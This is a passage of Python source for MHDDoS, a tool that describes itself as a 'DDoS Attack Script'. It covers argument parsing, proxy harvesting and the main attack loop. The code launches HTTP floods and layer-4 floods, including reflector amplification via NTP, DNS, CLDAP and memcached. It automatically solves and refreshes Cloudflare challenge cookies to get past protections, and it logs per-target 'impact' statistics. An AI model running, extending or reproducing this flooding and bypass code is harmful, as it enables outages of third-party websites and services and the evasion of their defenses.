                        ("Address: %s\nPing: %d\nAceepted Packets: %d/%d\nstatus: %s\n")
                        % (
                            r.address,
                            r.avg_rtt,
                            r.packets_received,
                            r.packets_sent,
                            "ONLINE" if r.is_alive else "OFFLINE",
                        )
                    )

    @staticmethod
    def stop():
        print("All Attacks has been Stopped !")
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print(
            (
                f"* MHDDoS v{__version__} - DDoS Attack Script With %d Methods\n"
                "Note: If the Proxy list is empty, The attack will run without proxies\n"
                "      If the Proxy file doesn't exist, the script will download proxies and check them.\n"
                "      Proxy Type 0 = All in config.json\n"
                "      SocksTypes:\n"
                "         - 6 = RANDOM\n"
                "         - 5 = SOCKS5\n"
                "         - 4 = SOCKS4\n"
                "         - 1 = HTTP\n"
                "         - 0 = ALL\n"
                " > Methods:\n"
                " - Layer4\n"
                " | %s | %d Methods\n"
                " - Layer7\n"
                " | %s | %d Methods\n"
                " - Tools\n"
                " | %s | %d Methods\n"
                " - Others\n"
                " | %s | %d Methods\n"
                " - All %d Methods\n"
                "\n"
                "Example:\n"
                "   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <refresh=optional>\n"
                "   L4: python3 %s <method> <ip:port> <threads> <duration>\n"
                "   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist> <refresh=optional>\n"
                "   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with"
                " Amplification)>\n"
            )
            % (
                len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                ", ".join(Methods.LAYER4_METHODS),
                len(Methods.LAYER4_METHODS),
                ", ".join(Methods.LAYER7_METHODS),
                len(Methods.LAYER7_METHODS),
                ", ".join(ToolsConsole.METHODS),
                len(ToolsConsole.METHODS),
                ", ".join(["TOOLS", "HELP", "STOP"]),
                3,
                len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                argv[0],
                argv[0],
                argv[0],
                argv[0],
            )
        )

    @staticmethod
    def ts_srv(domain):
        records, DnsResolver, Info = (
            ["_ts3._udp.", "_tsdns._tcp."],
            resolver.Resolver(),
            {},
        )
        DnsResolver.timeout, DnsResolver.lifetime = 1, 1
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, "SRV")
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip(".") + ":" + str(srv.port)
            except:
                Info[rec] = "Not found"
        return Info

    @staticmethod
    def info(domain):
        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
            return s.json()
        return {"success": False}


def handleProxyList(con, proxy_arg, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
        
    proxies = set()
    is_remote = str(proxy_arg).startswith(("http://", "https://"))
    
    if is_remote:
        logger.info(f"{bcolors.WARNING}[*] Resource: Synchronizing remote tactical assets from {bcolors.OKBLUE}{proxy_arg}{bcolors.RESET}")
        try:
            res = get(str(proxy_arg), timeout=15)
            if res.status_code != 200:
                raise Exception(f"HTTP {res.status_code}")
            
            data = res.text
            if proxy_ty == 0:
                for line in data.splitlines():
                    p = Proxy.fromString(line.strip())
                    if p: proxies.add(p)
            else:
                proxy_type_obj = ProxyType.stringToProxyType(str(proxy_ty))
                # Efficient Regex Parsing
                ip_port_pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)")
                for match in ip_port_pattern.finditer(data):
                    proxies.add(Proxy(match.group(1), int(match.group(2)), proxy_type_obj))
            
            if not proxies:
                logger.warning(f"{bcolors.WARNING}[!] Resource: Tactical failure - No active resources found at origin.{bcolors.RESET}")
            else:
                logger.info(f"{bcolors.OKGREEN}[*] Resource: Deployment successful. {len(proxies):,} active endpoints synchronized.{bcolors.RESET}")
        except Exception as e:
            logger.error(f"[!] Handshake Failed: {e}")
            if "ReloadSentinel" not in current_thread().name:
                exit(f"Origin Unreachable: {e}")
            return set()
    else:
        proxy_li = Path(proxy_arg)
        is_sentinel = "ReloadSentinel" in current_thread().name
        force_harvest = proxy_li.name.lower() in ("auto_harvest.txt", "auto")

        if not proxy_li.exists() or force_harvest:
            if proxy_li.name.lower() in ("auto_harvest.txt", "auto"):
                action_type = "Refreshing" if is_sentinel else "Scraping"
                logger.info(f"{bcolors.OKCYAN}[*] Auto-Harvest: {action_type} global tactical matrices. Please stand by...{bcolors.RESET}")
            else:
                logger.warning(f"{bcolors.WARNING}[!] Resource: Local asset missing. Initializing emergency fallback sequence.{bcolors.RESET}")
            
            proxy_li.parent.mkdir(parents=True, exist_ok=True)
            all_raw_proxies = ProxyManager.DownloadFromConfig(con, proxy_ty)
            
            if not all_raw_proxies:
                if is_sentinel: return set()
                exit("Tactical Matrix Depleted. Check uplink.")
                
            total_found = len(all_raw_proxies)
            logger.info(f"{bcolors.OKBLUE}[*] Resource: Acquired {total_found:,} raw tactical assets. Forwarding to Tactical Scorer...{bcolors.RESET}")
            
            with proxy_li.open("w", encoding="utf-8") as wr:
                wr.write("\n".join(str(p) for p in all_raw_proxies))
            
            proxies = all_raw_proxies
        else:
            proxies = ProxyUtiles.readFromFile(proxy_li)
            if proxies:
                logger.info(f"{bcolors.OKGREEN}[*] Resource: {len(proxies):,} local endpoints active.{bcolors.RESET}")
            else:
                logger.warning(f"{bcolors.WARNING}[!] Resource: Local asset pool empty. Tactical profile limited.{bcolors.RESET}")
                
    return proxies



async def main_async():
    try:
        loop = asyncio.get_event_loop()
        loop.set_default_executor(SYNC_EXECUTOR)
        one = argv[1].upper()
        if one == "HELP":
            raise IndexError()
        if one == "TOOLS":
            await asyncio.to_thread(ToolsConsole.runConsole)
            return
        if one == "STOP":
            await asyncio.to_thread(ToolsConsole.stop)
            return
        
        method, event, proxy_pool, refresh_mins = one, asyncio.Event(), TacticalProxyPool(), 0
        event.clear()
        urlraw = argv[2].strip()
        if not urlraw.startswith("http"):
            # Cloudflare-specific methods should default to HTTPS
            if any(cf_m in one.upper() for cf_m in ["CFB", "CFBUAM", "BEHAVIOR", "BROWSER"]):
                urlraw = "https://" + urlraw
            else:
                urlraw = "http://" + urlraw
        if method not in Methods.ALL_METHODS:
            exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))

        # --- Global Flags ---
        go_core_enabled = "--go" in argv
        _session_id = None
        for i, arg in enumerate(argv):
            if arg == "--session-id" and i + 1 < len(argv):
                _session_id = argv[i + 1]
                break

        if go_core_enabled:
            logger.info(f"{bcolors.OKGREEN}[*] Hybrid Core: High-performance Go Engine active.{bcolors.RESET}")
            # Map Python method to Go method
            go_method = "tcp" if method in {"TCP", "PPS", "KILLER"} else "udp"
            
            # Robust Target and port parsing
            parsed_url = urlparse(urlraw)
            go_host = parsed_url.hostname or urlraw.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
            go_port = parsed_url.port
            
            if not go_port:
                if ":" in urlraw.replace("//", ""):
                    try:
                        go_port = int(urlraw.split(":")[-1].split("/")[0])
                    except: pass
            
            if not go_port:
                go_port = 80 if urlraw.startswith("http:") else 443
            
            # Determine threads and duration
            try:
                if method in Methods.LAYER7_METHODS:
                    go_threads = int(argv[4])
                    go_duration = int(argv[7])
                else: # L4
                    go_threads = int(argv[3])
                    go_duration = int(argv[4])
            except:
                go_threads = 100
                go_duration = 60

            # Execute Go Core
            import subprocess
            go_cmd = [
                str(Path(__dir__ / "mhddos_go.exe")),
                "-target", str(go_host),
                "-port", str(go_port),
                "-threads", str(go_threads),
                "-duration", str(go_duration),
                "-method", go_method
            ]
            logger.info(f"[*] Executing Go Core: {' '.join(go_cmd)}")
            subprocess.run(go_cmd)
            return

        target_host = "Unknown"
        port = 80
        threads = 1
        timer = 3600

        if method in Methods.LAYER7_METHODS:
            url = URL(urlraw)
            target_host = url.host
            host = target_host
            if method != "TOR":
                try:
                    host = await asyncio.get_event_loop().run_in_executor(None, gethostbyname, target_host)
                except Exception as e:
                    exit("Hostname Unresolved: ", target_host, str(e))
            proxy_ty, threads, proxy_arg, rpc, timer = (
                int(argv[3]),
                int(argv[4]),
                argv[5].strip(),
                int(argv[6]),
                int(argv[7]),
            )
            
            # Global Flag Detection
            args_iter = iter(argv[8:])
            for arg in args_iter:
                if arg.isdigit():
                    refresh_mins = int(arg)
                elif arg == "--autoscale":
                    ENGINE_STATE.active_threads_target.value = threads
                elif arg == "--evasion":
                    pass
                elif arg == "--intensity":
                    try:
                        intensity_val = int(next(args_iter, 15))
                        ML_ENGINE.intensity = max(0, min(50, intensity_val))
                    except: pass
                elif arg == "--shared-cookie":
                    HttpFlood._cfbuam_cookie = next(args_iter, None)
                    HttpFlood._cfbuam_expiry = time() + 900 # Valid for 15 mins
                elif arg == "--shared-ua":
                    HttpFlood._cfbuam_ua = next(args_iter, None)
                elif arg == "--flaresolverr":
                    ENGINE_STATE.flaresolverr_url = next(args_iter, "http://localhost:8191/v1")

            # Auto-load from Intelligence DB if not provided
            if not HttpFlood._cfbuam_cookie:
                try:
                    intel = INTEL_DB.get_bypass_intel(target_host)
                    if intel:
                        HttpFlood._cfbuam_cookie = intel.get("cookie")
                        HttpFlood._cfbuam_ua = intel.get("ua")
                        HttpFlood._cfbuam_expiry = time() + 900
                        logger.info(f"{bcolors.OKGREEN}[*] Intelligence: Loaded persisted bypass tokens for {target_host}.{bcolors.RESET}")
                except Exception as e:
                    logger.debug(f"[!] Intelligence load error: {e}")

            def resolve_proxy_path(arg):
                if arg.startswith("http"): return arg
                # 1. Check Assets (User)
                p_assets = get_assets_path() / "proxies" / arg
                if p_assets.exists(): return p_assets
                # 2. Check Resource (System)
                p_res = get_project_root() / "resource" / "files" / "proxies" / arg
                if p_res.exists(): return p_res
                # Default to assets path for creation (harvest)
                return p_assets

            proxy_li = resolve_proxy_path(proxy_arg)
            useragent_li, referers_li, bombardier_path = (
                get_assets_path() / "useragent.txt",
                get_assets_path() / "referers.txt",
                Path.home() / "go/bin/bombardier",
            )
            if method == "BOMB":
                assert (
                    bombardier_path.exists()
                    or bombardier_path.with_suffix(".exe").exists()
                ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
            
            if not useragent_li.exists() or not referers_li.exists():
                exit("Critical Assets Missing (UA/Ref)")
            
            def _load_assets():
                with useragent_li.open("r", encoding="utf-8") as f:
                    u = [line.strip() for line in f if line.strip()]
                with referers_li.open("r", encoding="utf-8") as f:
                    r = [line.strip() for line in f if line.strip()]
                return set(u), set(r)

            uagents, referers = await asyncio.to_thread(_load_assets)
            
            if not uagents or not referers:
                exit("Critical Assets Empty")
            
            proxies = await asyncio.to_thread(handleProxyList, con, proxy_li, proxy_ty, url)
            if proxies:
                tactical_proxies = await TacticalProxyValidator.validate_and_score(set(proxies), str(url) if url else None, is_layer7=True)
                await asyncio.to_thread(proxy_pool.update_pool, tactical_proxies, list(proxies))
            else:
                await asyncio.to_thread(proxy_pool.update_pool, [], [])
            
            if refresh_mins > 0:
                logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
                sentinel = ReloadSentinel(refresh_mins, con, proxy_li, proxy_ty, proxy_pool, url)
                sentinel.start()

            if proxy_pool:
                elite_count = proxy_pool.get_elite_count()
                pool_size = proxy_pool.get_tactical_size()
                cffi_limit = max(50, min(200, int(elite_count * 1.5) if elite_count > 0 else pool_size // 2))
                readtoon_limit = max(25, min(100, elite_count if elite_count > 0 else pool_size // 4))
                HttpFlood._curl_cffi_sem = asyncio.Semaphore(cffi_limit)
                HttpFlood._readtoon_sem = asyncio.Semaphore(readtoon_limit)
                logger.info(f"{bcolors.OKCYAN}[*] Engine Tuning: Semaphores scaled dynamically (IMPERSONATE={cffi_limit}, BEHAVIOR={readtoon_limit}) based on {elite_count} elite nodes.{bcolors.RESET}")

            logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L7 async tasks...{bcolors.RESET}")
            for thread_id in range(threads):
                flood = HttpFlood(
                    thread_id,
                    url,
                    host,
                    method,
                    rpc,
                    event,
                    uagents,
                    referers,
                    proxy_pool,
                )
                asyncio.create_task(flood.run())

        elif method in Methods.LAYER4_METHODS:
            target = URL(urlraw)
            port, target_host = target.port, target.host
            host = target_host
            try:
                host = await asyncio.get_event_loop().run_in_executor(None, gethostbyname, target_host)
            except Exception as e:
                exit("Hostname Unresolved: ", target_host, str(e))
            if not port:
                logger.warning("[!] Port Missing. Defaulting to 80.")
                port = 80
            if port > 65535 or port < 1:
                exit("Invalid Port Configuration")
            
            if (
                method
                in {
                    "NTP",
                    "DNS",
                    "RDP",
                    "CHAR",
                    "MEM",
                    "CLDAP",
                    "ARD",
                    "SYN",
                    "ICMP",
                }
                and not ToolsConsole.checkRawSocket()
            ):
                exit("Raw Socket Privilege Required")
            
            threads, timer, ref = int(argv[3]), int(argv[4]), None
            
            # Dynamic Flag Detection for L4
            for arg in argv[5:]:
                if arg == "--autoscale":
                    ENGINE_STATE.active_threads_target.value = threads
                elif arg == "--evasion":
                    pass
                elif arg == "--intensity":
                    try:
                        intensity_val = int(next(args_iter, 15))
                        ML_ENGINE.intensity = max(0, min(50, intensity_val))
                    except: pass

            if len(argv) >= 6:
                argfive = argv[5].strip()
                if argfive and not argfive.startswith("--"):
                    def resolve_reflector_path(arg):
                        # 1. Check reflectors folder (System)
                        p_refl = get_project_root() / "resource" / "files" / "reflectors" / arg
                        if p_refl.exists(): return p_refl
                        # 2. Check files folder (Legacy/Root)
                        p_root = get_project_root() / "resource" / "files" / arg
                        if p_root.exists(): return p_root
                        # Default to reflectors folder
                        return p_refl

                    refl_li = resolve_reflector_path(argfive)
                    if method in {
                        "NTP",
                        "DNS",
                        "RDP",
                        "CHAR",
                        "MEM",
                        "CLDAP",
                        "ARD",
                    }:
                        if not refl_li.exists():
                            exit("Reflector Asset Missing")
                        ref_data = await asyncio.to_thread(refl_li.open("r").read)
                        ref = set(a.strip() for a in Tools.IP.findall(ref_data))
                        if not ref:
                            exit("Reflector Asset Empty")
                    elif argfive.isdigit() and len(argv) >= 7:
                        proxy_ty, proxy_arg = int(argfive), argv[6].strip()
                        if len(argv) >= 8 and argv[7].isdigit():
                            refresh_mins = int(argv[7])
                        proxy_li = (
                            proxy_arg
                            if proxy_arg.startswith("http")
                            else Path(__dir__ / "files/proxies" / proxy_arg)
                        )
                        proxies = await asyncio.to_thread(handleProxyList, con, proxy_li, proxy_ty)
                        if proxies:
                            tactical_proxies = await TacticalProxyValidator.validate_and_score(set(proxies), is_layer7=False)
                            proxy_pool.update_pool(tactical_proxies, list(proxies))
                        else:
                            proxy_pool.update_pool([], [])
                        
                        if refresh_mins > 0:
                            logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
                            sentinel = ReloadSentinel(refresh_mins, con, proxy_li, proxy_ty, proxy_pool)
                            sentinel.start()
                        
                        if method not in {
                            "MINECRAFT",
                            "MCBOT",
                            "TCP",
                            "CPS",
                            "CONNECTION",
                        }:
                            exit("Layer 4 Proxy Incompatibility")
            
            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
            if method == "MCBOT":
                try:
                    reader, writer = await asyncio.open_connection(host, port)
                    writer.write(Minecraft.handshake((host, port), protocolid, 1))
                    writer.write(Minecraft.data(b"\x00"))
                    await writer.drain()
                    resp = await reader.read(1024)
                    pid = Tools.protocolRex.search(str(resp))
                    protocolid = (
                        con["MINECRAFT_DEFAULT_PROTOCOL"]
                        if not pid
                        else int(pid.group(1))
                    )
                    if 47 < protocolid > 758:
                        protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                    writer.close()
                    await writer.wait_closed()
                except: pass
            
            logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L4 async tasks...{bcolors.RESET}")
            for thread_id in range(threads):
                l4 = Layer4((host, port), ref, method, event, proxy_pool, protocolid)
                asyncio.create_task(l4.run())

        logger.info(
            f"{bcolors.OKGREEN}[*] COMMAND LAUNCHED: Target: {target_host} | Method: {method} | Duration: {timer}s | Workers: {threads}{bcolors.RESET}"
        )

        # --- Create Attack History Session ---
        if _session_id:
            _proxy_count = len(proxy_pool) if proxy_pool else 0
            await asyncio.to_thread(INTEL_DB.create_session,
                session_id=_session_id,
                target=target_host,
                method=method,
                threads=threads,
                duration=timer,
                proxy_type=str(proxy_ty) if 'proxy_ty' in locals() else "",
                proxy_count=_proxy_count
            )

        event.set()
        ts = time()

        # Start Health Monitor
        hm = HealthMonitor(
            target_host, port, "L7" if method in Methods.LAYER7_METHODS else "L4"
        )
        asyncio.create_task(hm.run())

        # Start Dynamic Scaler if autoscale enabled
        if ENGINE_STATE.active_threads_target.value > 0:
            scaler = DynamicScaler(target_host)
            # DynamicScaler is a Thread, it monitors psutil which might block
            scaler.start()

        # Smart Cookie Auto-Refresh background task
        async def cookie_auto_refresher():
            while event.is_set() and time() < ts + timer:
                now = time()
                # If TTL < 120s and not already solving
                if HttpFlood._cfbuam_expiry and (HttpFlood._cfbuam_expiry - now) < 120 and HttpFlood._solve_phase != "solving":
                    if method in ["CFBUAM", "BEHAVIOR", "BYPASS", "CFB"]:
                        HttpFlood._solve_phase = "solving"
                        logger.info(f"{bcolors.OKCYAN}[*] Auto-Refresh: Pre-solving new cookie for {target_host}...{bcolors.RESET}")
                        try:
                            # Use next available proxy
                            proxy_str = str(proxy_pool.get_proxy()) if proxy_pool else None
                            ua_target = ML_ENGINE.get_fingerprint()["ua"]
                            
                            # Run solver in thread to not block flood
                            cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, target_host, proxy=proxy_str, user_agent=ua_target)
                            
                            if cookie and cookie != "_yummy=choco":
                                HttpFlood._cfbuam_cookie = cookie # Double-buffer is essentially instant swap
                                if ua: HttpFlood._cfbuam_ua = ua
                                HttpFlood._cfbuam_proxy = proxy_str
                                HttpFlood._cfbuam_expiry = time() + 900 # 15 mins
                                logger.info(f"{bcolors.OKGREEN}[*] Auto-Refresh: Successfully injected new cookie. Zero downtime.{bcolors.RESET}")
                            else:
                                logger.info(f"{bcolors.WARNING}[!] Auto-Refresh: Failed to solve. Will retry soon.{bcolors.RESET}")
                                HttpFlood._cfbuam_expiry = time() + 180 # Retry in 60s since TTL is < 120s
                        except Exception as e:
                            logger.debug(f"[!] Auto-Refresh Error: {e}")
                        finally:
                            HttpFlood._solve_phase = "flooding"
                await asyncio.sleep(10)
        
        if method in ["CFBUAM", "BEHAVIOR", "BYPASS", "CFB"]:
            asyncio.create_task(cookie_auto_refresher())

        while time() < ts + timer:
            # Capture metrics BEFORE reset for persistence
            _current_pps = int(REQUESTS_SENT)
            _current_bps = int(BYTES_SEND)
            _current_success = int(SUCCESS_SENT)
            _current_waf = int(WAF_SENT)
            _current_error = int(ERROR_SENT)
            _current_timeout = int(TIMEOUT_SENT)
            _current_lat = CURRENT_LATENCY.value
            _current_cpu = await asyncio.to_thread(psutil.cpu_percent, interval=0)
            _current_ram = psutil.virtual_memory().percent

            lat_str = (
                f"{_current_lat:.1f}ms"
                if _current_lat > 0
                else "TIMEOUT"
            )
            
            # Impact Reporting
            total_sampled = _current_success + _current_waf + _current_error + _current_timeout
            fidelity = round((_current_success / total_sampled * 100), 1) if total_sampled > 0 else 0.0
            impact_msg = f"Impact: {fidelity}% | OK: {_current_success}, WAF: {_current_waf}, ERR: {_current_error}, TMO: {_current_timeout}"

            logger.info(
                "Target: %s, Port: %s, Method: %s, PPS: %s, BPS: %s, Latency: %s, Pool: %d/%d / %d%%"
                % (
                    target_host,
                    port,
                    method,
                    Tools.humanformat(_current_pps),
                    Tools.humanbytes(_current_bps),
                    lat_str,
                    len(proxy_pool) if proxy_pool else 0,
                    proxy_pool.get_tactical_size() if proxy_pool else 0,
                    round((time() - ts) / timer * 100, 2),
                )
            )
            if total_sampled > 0:
                logger.info(f"{bcolors.OKCYAN}[*] {impact_msg}{bcolors.RESET}")
            
            # Bypass Solver Telemetry (for GUI/Dashboard)
            bypass_solver = HttpFlood._active_solver or "None"
            bypass_phase = HttpFlood._solve_phase or "idle"
            token_ttl = max(0, int(HttpFlood._cfbuam_expiry - time())) if HttpFlood._cfbuam_expiry else 0
            has_token = HttpFlood._cfbuam_cookie is not None and HttpFlood._cfbuam_cookie != "_yummy=choco"
            bypass_info = f"Solver: {bypass_solver} | Phase: {bypass_phase} | Token TTL: {token_ttl}s | Active: {has_token}"
            if bypass_solver != "None":
                logger.info(f"{bcolors.OKCYAN}[*] Bypass: {bypass_info}{bcolors.RESET}")

            # Persist metric to Attack History DB (non-blocking)
            if _session_id:
                # Store extra impact data in message for now or extend schema (v1.2.1 simplicity: use message)
                asyncio.create_task(asyncio.to_thread(INTEL_DB.record_metric,
                    _session_id, _current_pps, _current_bps,
                    _current_lat, _current_cpu, _current_ram
                ))

            REQUESTS_SENT.set(0)
            BYTES_SEND.set(0)
            SUCCESS_SENT.set(0)
            WAF_SENT.set(0)
            ERROR_SENT.set(0)
            TIMEOUT_SENT.set(0)
            await asyncio.sleep(1)

        event.clear()
        # Finalize session with aggregated stats
        if _session_id:
            await asyncio.to_thread(INTEL_DB.finalize_session, _session_id, 'completed')
        
        # Export tactical analytics
        BrowserEngine.export_session_stats(target_host, method, timer)
        
        shutdown()
        import os
        os._exit(0)

    except (IndexError, ValueError):
        ToolsConsole.usage()
    except Exception as e:
        import traceback
        # Finalize session as error if it was created
        if '_session_id' in locals() and _session_id:
            await asyncio.to_thread(INTEL_DB.finalize_session, _session_id, 'error')
            await asyncio.to_thread(INTEL_DB.record_event, _session_id, 'error', str(e))
        logger.error(f"{bcolors.FAIL}[!] ENGINE_CRASH: Critical Failure during deployment.{bcolors.RESET}")
        logger.error(f"{bcolors.FAIL}[!] ERROR_DETAILS: {str(e)}{bcolors.RESET}")
        logger.error(bcolors.FAIL + traceback.format_exc() + bcolors.RESET)
        import os
        os._exit(1)

if __name__ == "__main__":
    with suppress(KeyboardInterrupt):
        asyncio.run(main_async())
